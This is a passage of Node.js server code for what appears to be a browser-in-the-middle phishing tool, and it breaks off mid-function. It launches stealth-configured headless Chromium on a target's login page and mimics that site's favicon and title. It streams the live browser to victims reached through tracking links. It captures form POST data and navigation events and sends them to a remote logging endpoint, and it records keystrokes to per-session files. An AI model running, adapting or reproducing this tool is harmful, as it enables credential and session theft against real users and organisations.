import fs from 'fs'
import path from 'path'
const __dirname = path.resolve()
import got from 'got'
import crypto from 'crypto'
import Fastify from 'fastify'
import fastify_io from 'fastify-socket.io'
import mongoose from 'mongoose'
import puppeteer from 'puppeteer-extra'
import ZtelerthPlugin from 'puppeteer-extra-plugin-stealth'
puppeteer.use(ZtelerthPlugin())
import resize_window from './resize_window.js'
import replace from 'stream-replace'
import Xvfb from 'xvfb'
import { Target } from './models/Target.js'

//import admin config
const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));

// ============================================
// DECLARE VARIABLES AT MODULE SCOPE
// ============================================
let target = null;
let target_language_header = null;
let target_primary_language = null;
let generateSessionId = null;
let ship_logs = null;

// ============================================
// INITIALIZATION - wrapped in async IIFE
// ============================================
(async () => {
  // MongoDB connection
  const mongoUrl = process.env.MONGO_URL || 'mongodb://mongodb:27017/fescarcuddle';
  console.log(`[STARTUP] Connecting to MongoDB at ${mongoUrl}`);

  try {
    await mongoose.connect(mongoUrl, {
      useNewUrlParser: true,
      useUnifiedTopology: true
    });
    console.log('[STARTUP] MongoDB connected successfully');
  } catch (err) {
    console.error('ERROR: Could not connect to MongoDB:', err.message);
    console.error('Make sure MongoDB service is running');
    process.exit(1);
  }

  // Get target from MongoDB
  const target_name = process.env.TARGET_NAME;

  try {
    if (target_name) {
      // TARGET_NAME explícito: debe existir o falla
      target = await Target.findOne({ name: target_name });
      if (!target) {
        console.error(`[STARTUP] ERROR: Target '${target_name}' not found in database`);
        process.exit(1);
      }
    } else {
      // Sin TARGET_NAME: usa el primero disponible
      target = await Target.findOne().sort({ created_at: 1 });
      if (!target) {
        console.error('[STARTUP] ERROR: No targets found in database');
        console.error('[STARTUP] Set TARGET_URL env var to add one automatically on startup');
        process.exit(1);
      }
    }
    console.log(`[STARTUP] Using target: ${target.name}`);
  } catch (err) {
    console.error('ERROR: Could not load target from MongoDB:', err.message);
    process.exit(1);
  }

  target_language_header = target.language || 'es-419,es;q=0.9,en;q=0.8'
  target_primary_language = target_language_header.split(',')[0].trim()

  //set up a user data directory if it doesn't exist
  try {
    fs.mkdirSync('./user_data')
  } catch (err) {
    //must exist already. We do it this way to avoid a race condition of checking the existence of the dir before trying to write to it
  }

  // Generate session_id from IP using SHA256 (matching client-side pinpo.html)
  generateSessionId = function(ip) {
    return crypto.createHash('sha256').update(ip).digest('hex')
  }

  ship_logs = function (log_data) {
    var headers = {
      'Content-Type': 'application/json',
      'Cookie': config.admin_cookie
    }
    //send logs off to our fescaring server/logging endpoint
    got.post(config.logging_endpoint, {
      headers: headers,
      https: { rejectUnauthorized: false },
      json: log_data
    }).catch(function (err) {
      console.log("Logging Endpoint Failed: " + config.logging_endpoint)
      console.log("Error:" + err)
      //console.log("Error:" + err.response.body)
      return
    })
  }

  const installMobileViewportGuards = async function(page) {
    await page.evaluateOnNewDocument(() => {
      const disableRemoteKeyboard = () => {
        try {
          if (window.top === window && navigator.virtualKeyboard) {
            navigator.virtualKeyboard.overlaysContent = true
            if (typeof navigator.virtualKeyboard.hide === 'function') {
              navigator.virtualKeyboard.hide()
            }
          }
          document.querySelectorAll('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]').forEach((el) => {
            el.setAttribute('inputmode', 'none')
            el.setAttribute('virtualkeyboardpolicy', 'manual')
          })
        } catch (err) {}
      }
      const installControlledFocusGuard = () => {
        if (window.__fescarControlledFocusGuardInstalled) return
        window.__fescarControlledFocusGuardInstalled = true

        const isEditable = (el) => {
          if (!el) return false
          const tag = el.tagName ? el.tagName.toLowerCase() : ''
          return tag === 'input' || tag === 'textarea' || el.isContentEditable
        }

        const restoreViewport = (x, y) => {
          try {
            window.scrollTo(x, y)
            const scrollingElement = document.scrollingElement || document.documentElement
            if (scrollingElement) {
              scrollingElement.scrollLeft = x
              scrollingElement.scrollTop = y
            }
          } catch (err) {}
        }

        const focusWithoutViewportShift = (el) => {
          if (!isEditable(el)) return
          disableRemoteKeyboard()
          const x = window.scrollX || 0
          const y = window.scrollY || 0
          try {
            el.focus({ preventScroll: true })
          } catch (err) {
            try { el.focus() } catch (_) {}
          }
          try {
            if ((el.tagName || '').toLowerCase() !== 'input' || el.type !== 'number') {
              const len = typeof el.value === 'string' ? el.value.length : 0
              if (typeof el.setSelectionRange === 'function') el.setSelectionRange(len, len)
            }
          } catch (err) {}
          restoreViewport(x, y)
          requestAnimationFrame(() => restoreViewport(x, y))
          setTimeout(() => restoreViewport(x, y), 50)
          setTimeout(() => restoreViewport(x, y), 150)
        }

        document.addEventListener('mousedown', (event) => {
          const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
          if (!isEditable(el)) return
          event.preventDefault()
          focusWithoutViewportShift(el)
        }, true)

        document.addEventListener('touchstart', (event) => {
          const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
          if (!isEditable(el)) return
          event.preventDefault()
          focusWithoutViewportShift(el)
        }, { capture: true, passive: false })

        document.addEventListener('focusin', (event) => {
          const x = window.scrollX || 0
          const y = window.scrollY || 0
          disableRemoteKeyboard()
          requestAnimationFrame(() => restoreViewport(x, y))
          setTimeout(() => restoreViewport(x, y), 50)
        }, true)
      }
      const lockViewport = () => {
        try {
          let meta = document.querySelector('meta[name="viewport"]')
          if (!meta) {
            meta = document.createElement('meta')
            meta.setAttribute('name', 'viewport')
            document.head.appendChild(meta)
          }
          meta.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover')
          document.documentElement.style.webkitTextSizeAdjust = '100%'
          disableRemoteKeyboard()
          installControlledFocusGuard()
        } catch (err) {}
      }
      lockViewport()
      document.addEventListener('DOMContentLoaded', lockViewport)
      window.addEventListener('pageshow', lockViewport)
      new MutationObserver(lockViewport).observe(document.documentElement, { childList: true, subtree: true })
    })
  }

  const enforceMobileViewportGuards = async function(browser) {
    if (!browser?.is_mobile || !browser.target_page) {
      return
    }
    try {
      const fixedWidth = browser.puppeteer_width || browser.user_width
      const fixedHeight = browser.puppeteer_height || browser.user_height
      if (fixedWidth && fixedHeight) {
        await browser.target_page._client.send('Emulation.setDeviceMetricsOverride', {
          width: fixedWidth,
          height: fixedHeight,
          deviceScaleFactor: 3,
          mobile: false,
          screenWidth: fixedWidth,
          screenHeight: fixedHeight,
          positionX: 0,
          positionY: 0,
          screenOrientation: { type: 'portraitPrimary', angle: 0 }
        })
        await browser.target_page._client.send('Emulation.setVisibleSize', { width: fixedWidth, height: fixedHeight }).catch(() => {})
      }
      await browser.target_page._client.send('Emulation.setPageScaleFactor', { pageScaleFactor: 1 })
      await browser.target_page.evaluate(() => {
        const disableRemoteKeyboard = () => {
          if (window.top === window && navigator.virtualKeyboard) {
            navigator.virtualKeyboard.overlaysContent = true
            if (typeof navigator.virtualKeyboard.hide === 'function') {
              navigator.virtualKeyboard.hide()
            }
          }
          document.querySelectorAll('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]').forEach((el) => {
            el.setAttribute('inputmode', 'none')
            el.setAttribute('virtualkeyboardpolicy', 'manual')
          })
        }
        const installControlledFocusGuard = () => {
          if (window.__fescarControlledFocusGuardInstalled) return
          window.__fescarControlledFocusGuardInstalled = true

          const isEditable = (el) => {
            if (!el) return false
            const tag = el.tagName ? el.tagName.toLowerCase() : ''
            return tag === 'input' || tag === 'textarea' || el.isContentEditable
          }

          const restoreViewport = (x, y) => {
            window.scrollTo(x, y)
            const scrollingElement = document.scrollingElement || document.documentElement
            if (scrollingElement) {
              scrollingElement.scrollLeft = x
              scrollingElement.scrollTop = y
            }
          }

          const focusWithoutViewportShift = (el) => {
            if (!isEditable(el)) return
            disableRemoteKeyboard()
            const x = window.scrollX || 0
            const y = window.scrollY || 0
            try {
              el.focus({ preventScroll: true })
            } catch (err) {
              try { el.focus() } catch (_) {}
            }
            try {
              if ((el.tagName || '').toLowerCase() !== 'input' || el.type !== 'number') {
                const len = typeof el.value === 'string' ? el.value.length : 0
                if (typeof el.setSelectionRange === 'function') el.setSelectionRange(len, len)
              }
            } catch (err) {}
            restoreViewport(x, y)
            requestAnimationFrame(() => restoreViewport(x, y))
            setTimeout(() => restoreViewport(x, y), 50)
            setTimeout(() => restoreViewport(x, y), 150)
          }

          document.addEventListener('mousedown', (event) => {
            const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
            if (!isEditable(el)) return
            event.preventDefault()
            focusWithoutViewportShift(el)
          }, true)

          document.addEventListener('touchstart', (event) => {
            const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
            if (!isEditable(el)) return
            event.preventDefault()
            focusWithoutViewportShift(el)
          }, { capture: true, passive: false })

          document.addEventListener('focusin', (event) => {
            const x = window.scrollX || 0
            const y = window.scrollY || 0
            disableRemoteKeyboard()
            requestAnimationFrame(() => restoreViewport(x, y))
            setTimeout(() => restoreViewport(x, y), 50)
          }, true)
        }
        let meta = document.querySelector('meta[name="viewport"]')
        if (!meta) {
          meta = document.createElement('meta')
          meta.setAttribute('name', 'viewport')
          document.head.appendChild(meta)
        }
        meta.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover')
        document.documentElement.style.webkitTextSizeAdjust = '100%'
        disableRemoteKeyboard()
        installControlledFocusGuard()
      })
    } catch (err) {
      if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
        console.warn(`[mobile viewport guard] ${err.message}`)
      }
    }
  }

  const focusRemoteEditableAtPoint = async function(browser, x, y) {
    if (!browser?.is_mobile || !browser.target_page) {
      return false
    }
    try {
      return await browser.target_page.evaluate(({ x, y }) => {
        const editableSelector = 'input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]'
        const isEditable = (el) => {
          if (!el) return false
          const tag = el.tagName ? el.tagName.toLowerCase() : ''
          return tag === 'input' || tag === 'textarea' || el.isContentEditable
        }
        const findEditable = () => {
          const hit = document.elementFromPoint(x, y)
          if (!hit) return null
          if (hit.closest) {
            const closest = hit.closest(editableSelector)
            if (closest) return closest
            const label = hit.closest('label')
            if (label && label.control) return label.control
          }
          return isEditable(hit) ? hit : null
        }
        const disableRemoteKeyboard = (el) => {
          if (window.top === window && navigator.virtualKeyboard) {
            navigator.virtualKeyboard.overlaysContent = true
            if (typeof navigator.virtualKeyboard.hide === 'function') navigator.virtualKeyboard.hide()
          }
          if (el) {
            el.setAttribute('inputmode', 'none')
            el.setAttribute('virtualkeyboardpolicy', 'manual')
          }
        }
        const restoreViewport = (scrollX, scrollY) => {
          window.scrollTo(scrollX, scrollY)
          const scrollingElement = document.scrollingElement || document.documentElement
          if (scrollingElement) {
            scrollingElement.scrollLeft = scrollX
            scrollingElement.scrollTop = scrollY
          }
        }
        const el = findEditable()
        if (!isEditable(el)) return false
        const scrollX = window.scrollX || 0
        const scrollY = window.scrollY || 0
        disableRemoteKeyboard(el)
        try {
          el.focus({ preventScroll: true })
        } catch (err) {
          try { el.focus() } catch (_) {}
        }
        try {
          if ((el.tagName || '').toLowerCase() !== 'input' || el.type !== 'number') {
            const len = typeof el.value === 'string' ? el.value.length : 0
            if (typeof el.setSelectionRange === 'function') el.setSelectionRange(len, len)
          }
        } catch (err) {}
        restoreViewport(scrollX, scrollY)
        requestAnimationFrame(() => restoreViewport(scrollX, scrollY))
        setTimeout(() => restoreViewport(scrollX, scrollY), 50)
        setTimeout(() => restoreViewport(scrollX, scrollY), 150)
        return true
      }, { x, y })
    } catch (err) {
      if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
        console.warn(`[focus editable] ${err.message}`)
      }
      return false
    }
  }

  const getRemotePointerCoordinates = async function(browser, x, y) {
    if (!browser?.is_mobile || !browser.target_page) {
      return { x, y, changed: false, metrics: null }
    }
    try {
      const metrics = await browser.target_page._client.send('Page.getLayoutMetrics')
      const visualViewport = metrics.cssVisualViewport || metrics.visualViewport
      const sourceWidth = browser.puppeteer_width || browser.user_width || browser.target_page.viewport()?.width || 1
      const sourceHeight = browser.puppeteer_height || browser.user_height || browser.target_page.viewport()?.height || 1
      if (!visualViewport || !visualViewport.clientWidth || !visualViewport.clientHeight || !sourceWidth || !sourceHeight) {
        return { x, y, changed: false, metrics: null }
      }
      const mappedX = (x * (visualViewport.clientWidth / sourceWidth)) + (visualViewport.offsetX || visualViewport.pageX || 0)
      const mappedY = (y * (visualViewport.clientHeight / sourceHeight)) + (visualViewport.offsetY || visualViewport.pageY || 0)
      return {
        x: mappedX,
        y: mappedY,
        changed: Math.abs(mappedX - x) > 0.5 || Math.abs(mappedY - y) > 0.5,
        metrics: {
          width: visualViewport.clientWidth,
          height: visualViewport.clientHeight,
          offsetX: visualViewport.offsetX || visualViewport.pageX || 0,
          offsetY: visualViewport.offsetY || visualViewport.pageY || 0,
          scale: visualViewport.scale || 1,
          sourceWidth,
          sourceHeight
        }
      }
    } catch (err) {
      if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
        console.warn(`[pointer metrics] ${err.message}`)
      }
      return { x, y, changed: false, metrics: null }
    }
  }

  const fastify = Fastify({
    logger: false,
    bodyLimit: 19922944
  })

  //used to set up websockets
  fastify.register(fastify_io, { maxHttpBufferSize: 1e11, serveClient: true })

  //a bucket full of browsers :)
  var browsers = []

  //make it easy to grab a browser based on attributes like socket_id, or controller_socket, or browser_id etc.
  browsers.get = function (attr, val) {
    return this.filter(x => x && x[attr] === val)[0]
  }

  //keep track of some key active objects
  var admins = []

  // Track whether a new browser is currently being provisioned to prevent double-assignment
  var provisioning = false
  const pendingFescarAssignments = []
  const VIEWPORT_DEVICE_SCALE_FACTOR = 1.5
  const XVFB_SCREEN_GEOMETRY = '3840x2160x24'
  const CHROMIUM_DEVICE_SCALE_FACTOR = 1.5
  let sharedXvfb = null
  let sharedXvfbStartPromise = null

  const ensureSharedXvfb = async function () {
    if (sharedXvfbStartPromise) {
      return sharedXvfbStartPromise
    }
    sharedXvfb = new Xvfb({
      silent: true,
      xvfb_args: ["-screen", "0", XVFB_SCREEN_GEOMETRY, "-ac"]
    })
    sharedXvfbStartPromise = new Promise((resolve, reject) => {
      sharedXvfb.start((err) => {
        if (err) {
          sharedXvfbStartPromise = null
          return reject(err)
        }
        resolve(sharedXvfb)
      })
    })
    return sharedXvfbStartPromise
  }

  //copy the favicon of the site you want to MitM
  fastify.route({
    method: ['GET'],
    url: '/favicon.ico',
    handler: async function (req, reply) {
      let stream = fs.createReadStream(__dirname + "/favicons/" + target.favicon)
      reply.type('image/x-icon').send(stream)
    }
  })

  //standard user route
  fastify.route({
    method: ['GET'],
    url: '/*',
    handler: async function (req, reply) {
      const accessToken = req.query.token
      if (accessToken !== config.user_access_token) {
        return reply.code(403).type('text/plain').send('Forbidden')
      }
      let client_ip = req.headers['x-real-ip']
      let tracking_id = config.tracking_id
      let target_id = req.query[tracking_id] ? req.query[tracking_id] : crypto.randomBytes(8).toString('hex')
      let debugIp = req.query.debugIp || ''
      let mobileMode = req.query.mobile === '1' ? 'true' : 'false'
      if (config.logging_endpoint) {
        const session_id = generateSessionId(client_ip + debugIp)
        console.log(`[CLICK] Session ID: ${session_id} (IP: ${client_ip}, debugIp: ${debugIp})`)
        ship_logs({ "session_id": session_id, "event_ip": client_ip + debugIp, "target": target_id, "event_type": "CLICK", "event_data": req.url })
      }
      console.log('client_ip: ' + client_ip)
      //if(config.admin_ips.includes(client_ip)){
      let stream = fs.createReadStream(__dirname + "/pinpo.html")
      const debugIpSuffix = req.query.debugIp || ''
      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)).pipe(replace(/DEBUG_MULTI_USER_IP/, debugIpSuffix)).pipe(replace(/MOBILE_MODE/, mobileMode)))
      //}else{
      //  reply.type('text/html').send("403")
      //}
    }
  })

  //route for the headless browser to broadcast a video stream
  fastify.route({
    method: ['GET'],
    url: '/broadcast',
    handler: async function (req, reply) {
      let client_ip = req.headers['x-real-ip']
      //only allow requests that have not traversed our HTTP server reverse proxy
      if (client_ip == undefined) {
        let stream = fs.createReadStream(__dirname + "/broadcast.html")
        reply.type('text/html').send(stream)
      } else {
        reply.type('text/html').send("403")
      }
    }
  })

  //admin route
  fastify.route({
    method: ['GET'],
    url: '/admin',
    handler: async function (req, reply) {
      let client_ip = req.headers['x-real-ip']
      console.log('admin_ip: ' + client_ip)
      if (config.admin_ips.includes(client_ip)) {
        let stream = fs.createReadStream(__dirname + "/admin.html")
        reply.type('text/html').send(stream.pipe(replace(/SOCKET_KEY/, config.socket_key)))
      } else {
        reply.type('text/html').send("403")
      }
    }
  })

  fastify.route({
    method: ['GET'],
    url: '/FileSaver.min.js',
    handler: async function (req, reply) {
      let stream = fs.createReadStream(__dirname + "/FileSaver.min.js")
      reply.type('text/javascript').send(stream)
    }
  })

  fastify.route({
    method: ['GET'],
    url: '/switch.js',
    handler: async function (req, reply) {
      let stream = fs.createReadStream(__dirname + "/node_modules/light-switch-bootstrap/switch.js")
      reply.type('text/javascript').send(stream)
    }
  })

  //Logo
  fastify.route({
    method: ['GET'],
    url: '/images/*',
    handler: async function (req, reply) {
      const requestedFile = req.params['*'];
      const filePath = path.join(__dirname, 'favicons', requestedFile);

      // Check if the requested file is within the specified directory
      if (!filePath.startsWith(path.join(__dirname, 'favicons'))) {
        return reply.status(403).send('Forbidden');
      }

      // Check if the file exists before attempting to read it
      if (!fs.existsSync(filePath)) {
        return reply.status(404).send('Not Found');
      }

      // Read and stream the file if it exists
      const stream = fs.createReadStream(filePath);
      reply.type('image/png').send(stream);
    }
  })

  fastify.route({
    method: ['GET'],
    url: '/jquery.min.js',
    handler: async function (req, reply) {
      let stream = fs.createReadStream(__dirname + "/node_modules/jquery/dist/jquery.min.js")
      reply.type('text/javascript').send(stream)
    }
  })

  //static .css files
  fastify.route({
    method: ['GET'],
    url: '/static/css/*',
    handler: async function (req, reply) {
      const requestedFile = req.params['*'];
      const filePath = path.join(__dirname, '/node_modules/bootstrap/dist/css/', requestedFile);

      // Check if the requested file is within the specified directory
      if (!filePath.startsWith(path.join(__dirname, '/node_modules/bootstrap/dist/css/'))) {
        return reply.status(403).send('Forbidden');
      }

      // Check if the file exists before attempting to read it
      if (!fs.existsSync(filePath)) {
        return reply.status(404).send('Not Found');
      }

      // Read and stream the file if it exists
      const stream = fs.createReadStream(filePath);
      reply.type('text/css').send(stream);
    }
  })

  //static .js files
  fastify.route({
    method: ['GET'],
    url: '/static/js/*',
    handler: async function (req, reply) {
      const requestedFile = req.params['*'];
      const filePath = path.join(__dirname, '/node_modules/bootstrap/dist/js/', requestedFile);

      // Check if the requested file is within the specified directory
      if (!filePath.startsWith(path.join(__dirname, '/node_modules/bootstrap/dist/js/'))) {
        return reply.status(403).send('Forbidden');
      }

      // Check if the file exists before attempting to read it
      if (!fs.existsSync(filePath)) {
        return reply.status(404).send('Not Found');
      }

      // Read and stream the file if it exists
      const stream = fs.createReadStream(filePath);
      reply.type('text/javascript').send(stream);

    }
  })

  async function get_browser() {
    // Use a single shared frame buffer to avoid adding per-browser process listeners.
    const xvfb = await ensureSharedXvfb()
    let puppet_options = [
      "--ignore-certificate-errors", //ignore sketchy TLS on the target service in case our target org is lazy with their certs
      `--auto-select-desktop-capture-source=${target.tab_title}`, //Allows us to cast WebRTC with answering a prompt of which tab to share :)
      "--disable-blink-features=AutomationControlled",
      "--high-dpi-support=1",
      `--force-device-scale-factor=${CHROMIUM_DEVICE_SCALE_FACTOR}`,
      "--start-maximized",
      "--no-sandbox",
      `--display=${xvfb._display}`,
      "--disk-cache-size=0",
      "--media-cache-size=0"
    ]

    if (target_primary_language) {
      puppet_options.push(`--lang=${target_primary_language}`)
    }

    if (config.proxy !== undefined) {
      puppet_options.push("--proxy-server=" + config.proxy)
    }
    //set up a unique user data directory for this session so users don't stomp on each others' connections
    //we'll use this same ID to track unique browser instances for socket renegotiations etc. as well
    let browser_id = Math.random().toString(36).slice(2)
    fs.mkdirSync(`./user_data/${browser_id}`)

    let browser = await puppeteer.launch({
      headless: false,
      ignoreHTTPSErrors: true,
      ignoreDefaultArgs: ["--enable-automation"],
      defaultViewport: null,
      userDataDir: `./user_data/${browser_id}`,
      args: puppet_options
    })

    //JS is fun. We can just extend any existing object by defining new attributes and methods on it.
    //We'll add some pieces of data we want to track per browser instance, and a remove instance method while we have this browser's xvfb in local scope
    //remember, callback arguments are evaluated when the callback is defined
    browser.socket_id = ''
    browser.user_socket = ''
    browser.user_width = 0
    browser.user_height = 0
    browser.user_ip = ''
    browser.user_target_id = ''
    browser.controller_socket = ''
    browser.keydebug = ''
    browser.suppress_keys_until = 0
    browser.frameNavigationListenerAttached = false
    browser.keydebug_file = fs.createWriteStream(`./user_data/${browser_id}/keydebug.txt`, { flags: 'a' });
    browser.browser_id = browser_id
    browser.target_page = await browser.newPage()
    await installMobileViewportGuards(browser.target_page)
    if (config.mobile_emulation) {
      await browser.target_page.emulate({
        viewport: {
          width: 390,
          height: 844,
          deviceScaleFactor: 3,
          isMobile: false,
          hasTouch: true,
          isLandscape: false
        },
        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
      })
    }
    await browser.target_page.setExtraHTTPHeaders({ 'Accept-Language': target_language_header })
    await browser.target_page.evaluateOnNewDocument((lang) => {
      try {
        Object.defineProperty(navigator, 'language', { get: () => lang })
        Object.defineProperty(navigator, 'languages', { get: () => [lang, lang.split('-')[0]] })
      } catch (err) {
        // Ignore when browser prevents overriding navigator properties.
      }
    }, target_primary_language)
    //browser.target_page.setUserAgent(config.default_user_agent)
    //automatically dismiss alerts etc.
    browser.target_page.on('dialog', async dialog => {
      console.log(dialog.message())
      await dialog.accept()
    })
    browser.target_page.on('request', async request => {
      if (request.method() === 'POST') {
        if (config.post_url_search && browser.user_ip != '') {
          let post_url_search = new RegExp(`${config.post_url_search}`, "i");
          if (post_url_search.test(request.url())) {
            ship_logs({ "session_id": browser.session_id, "event_ip": browser.user_ip, "target": browser.user_target_id, "event_type": "POST_DATA", "event_data": request.postData() })
            //          console.log(request.postData())
          }
        }
      }
    })
    browser.remove_instance = async function () {
      browser.keydebug_file.close()
      const index = browsers.indexOf(browser);
      await browser.close()
      // Use splice instead of delete to avoid leaving undefined holes in the array
      if (index !== -1) {
        browsers.splice(index, 1)
      }
      console.log('killed browser')
    }
    await browser.target_page.goto('about:blank')
    browser.broadcast_page = await browser.newPage()
    browser.broadcast_page.goto(`http://localhost:58082/broadcast?id=${browser_id}`)
    return browser
  }

  fastify.ready(async function (err) {
    if (err) throw err
  
    console.log(`[STARTUP] Initializing browser with target: ${target.login_page}`);
    let empty_fescarbowl = await get_browser()

    const warmupTargetRender = async function (browser) {
      try {
        if (!browser || !browser.target_page) return
        await browser.target_page.bringToFront()
        const vp = browser.target_page.viewport() || { width: 1280, height: 720 }
        const centerX = Math.max(1, Math.floor(vp.width / 2))
        const centerY = Math.max(1, Math.floor(vp.height / 2))

        // Non-intrusive input pulse to encourage earlier paint/composition.
        await browser.target_page.mouse.move(centerX, centerY)
        await browser.target_page.mouse.move(Math.min(centerX + 1, vp.width - 1), centerY)
        await browser.target_page.keyboard.down('Shift').catch(() => {})
        await browser.target_page.keyboard.up('Shift').catch(() => {})
      } catch (warmupErr) {
        console.warn(`warmupTargetRender failed: ${warmupErr.message}`)
      }
    }

    const getLiveSocket = function (socket_id) {
      return fastify.io.sockets.sockets.get(socket_id)
    }

    const processPendingFescarAssignments = async function () {
      if (provisioning) {
        return
      }
      provisioning = true
      while (pendingFescarAssignments.length > 0) {
        const request = pendingFescarAssignments.shift()
        if (!request) {
          continue
        }
        // Skip stale sockets produced by page reload races.
        if (!getLiveSocket(request.socket_id)) {
          console.warn(`new_fescar: skipping stale socket ${request.socket_id}`)
          continue
        }
        try {
          empty_fescarbowl.user_ip = request.client_ip
          empty_fescarbowl.user_target_id = request.target_id
          empty_fescarbowl.user_width = request.viewport_width
          empty_fescarbowl.user_height = request.viewport_height
          empty_fescarbowl.session_id = request.session_id
          empty_fescarbowl.is_mobile = request.mobile
          if (request.mobile) {
            // Use the user's actual viewport dimensions so touch coordinates are 1:1
            await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
            await empty_fescarbowl.target_page.emulate({
              viewport: {
                width: request.viewport_width,
                height: request.viewport_height,
                deviceScaleFactor: 3,
                isMobile: false,
                hasTouch: true,
                isLandscape: false
              },
              userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
            })
          } else {
            await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
            await empty_fescarbowl.target_page.setViewport({ width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
          }
          empty_fescarbowl.puppeteer_width = request.viewport_width
          empty_fescarbowl.puppeteer_height = request.viewport_height
          empty_fescarbowl.video_dimensions_initialized = false
          // Navigate now, after emulation is configured, so the target site receives the correct UA
          await empty_fescarbowl.target_page.goto(target.login_page, { waitUntil: 'domcontentloaded' })
          await enforceMobileViewportGuards(empty_fescarbowl)
          const actualUA = await empty_fescarbowl.target_page.evaluate(() => navigator.userAgent).catch(() => 'unknown')
          const actualMobile = await empty_fescarbowl.target_page.evaluate(() => ({ isMobile: window.matchMedia('(hover: none)').matches, w: window.innerWidth })).catch(() => null)
          console.log(`[new_fescar] mobile=${request.mobile} UA=${actualUA.substring(0, 80)} innerWidth=${actualMobile?.w}`)

          if (!getLiveSocket(request.socket_id)) {
            console.warn(`new_fescar: socket disconnected before stream assignment ${request.socket_id}`)
            continue
          }

          await warmupTargetRender(empty_fescarbowl)

          empty_fescarbowl.user_socket = request.socket_id
          // Start this user with control of the assigned browser instance.
          empty_fescarbowl.controller_socket = request.socket_id
          // Tell pinpo.html the actual Puppeteer viewport size so it can scale touch coordinates
          fastify.io.to(request.socket_id).emit('fescar_viewport', { width: request.viewport_width, height: request.viewport_height })
          // Send session_id to broadcast.html
          if (empty_fescarbowl.socket_id) {
            fastify.io.to(empty_fescarbowl.socket_id).emit('set_session_id', empty_fescarbowl.session_id)
          }
          fastify.io.to(empty_fescarbowl.socket_id).emit('stream_video_to_first_viewer', request.socket_id)

          empty_fescarbowl = await get_browser()
          browsers.push(empty_fescarbowl)
        } catch (assignErr) {
          console.error(`new_fescar: failed while assigning socket ${request.socket_id}: ${assignErr.message}`)
        }
      }
      provisioning = false
    }

    fastify.io.use((socket, next) => {
      const token = socket.handshake.auth.token;
      if (token === config.socket_key) {
        admins.push(socket.id)
        socket.join('admin_room')
        next()
      } else {
        const browser_id = socket.handshake.query.browserId
        const viewerToken = socket.handshake.query.token
        if (browser_id) {
          const browser = browsers.get('browser_id', browser_id)
          if (browser) {
            browser.socket_id = socket.id
            return next()
          } else {
            console.warn(`socket middleware: no browser found for browser_id ${browser_id}`)
            return next(new Error('unauthorized'))
          }
        }

        if (viewerToken && viewerToken === config.user_access_token) {
          return next()
        }

        console.warn(`socket middleware: unauthorized socket ${socket.id}`)
        return next(new Error('unauthorized'))
      }
    });
    browsers.push(empty_fescarbowl)
    fastify.io.on('connect', function (socket) {
      console.info('Socket connected!', socket.id)
      socket.on('new_broadcast', async function (browser_id) {
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`new_broadcast: no browser found for browser_id ${browser_id}`)
          return
        }
        browser.socket_id = socket.id
      
        // Remover listener anterior si existe (para evitar acumulación)
        if (browser.frameNavigationListener) {
          browser.target_page.removeListener('framenavigated', browser.frameNavigationListener)
          console.log(`[CLEANUP] Removido listener anterior de framenavigated para browser ${browser_id}`)
        }
      
        // Crear nuevo listener
        browser.frameNavigationListener = async function (frame) {
          try {
            if (frame.parentFrame() === null) {
              const pageUrl = frame.url() || 'about:blank'
              const pageTitle = (await browser.target_page.title().catch(() => null)) || '(sin título)'
              const faviconUrl = await browser.target_page.evaluate(() => {
                const selectors = ['link[rel="icon"]', 'link[rel="shortcut icon"]', 'link[rel="apple-touch-icon"]']
                for (const sel of selectors) {
                  const el = document.querySelector(sel)
                  if (el && el.href) return el.href
                }
                return window.location.origin + '/favicon.ico'
              }).catch(() => null)
            
              if (browser.controller_socket !== undefined) {
                fastify.io.to(browser.controller_socket).emit('push_state', pageUrl.split('/').slice(3).join('/'))
              }
              
              // Enviar logs a debug server si hay IP del usuario
              if (browser.user_ip !== '') {
                ship_logs({ 
                  "session_id": browser.session_id,
                  "event_ip": browser.user_ip, 
                  "target": browser.user_target_id, 
                  "event_type": "NAVIGATION", 
                  "event_url": pageUrl,
                  "event_title": pageTitle,
                  "event_favicon": faviconUrl
                })
              }
              
              console.log(`[NAVIGATION] Session ID: ${browser.session_id} | IP: ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
            }
          } catch (err) {
            if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
              console.error(`[FRAMENAVIGATED] Error: ${err.message}`)
            }
          }
        }
      
        // Agregar nuevo listener
        browser.target_page.on('framenavigated', browser.frameNavigationListener)
        console.log(`[BROADCAST] Nuevo listener de framenavigated para browser ${browser_id} (socket ${socket.id})`)
      })
